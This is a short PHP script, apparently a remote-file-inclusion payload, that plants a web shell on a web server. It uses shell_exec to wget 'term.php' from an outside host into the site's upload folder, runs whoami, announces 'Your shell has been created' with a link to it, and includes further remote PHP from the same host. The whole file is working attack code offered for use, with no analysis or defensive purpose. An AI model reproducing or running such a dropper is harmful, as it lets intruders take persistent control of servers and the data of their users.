<?php

if(!file_exists("/var/www/html/upload/term.php")){
/*echo "<pre>"; */
echo shell_exec("cd /var/www/html/upload/; wget http://ipwnu.com/term.php;");
/*  ls -larth;");
//echo "</pre>";*/
}

$message = "Your shell has been created and is available here: <a href='/upload/term.php'>PHP Shell</a> (<a href='?page=http://ipwnu.com/remphpshell'>Del</a>)";
$message .= "<br>User: ".exec("whoami")."<br>Pass: admin";

include("http://ipwnu.com/dir.php");
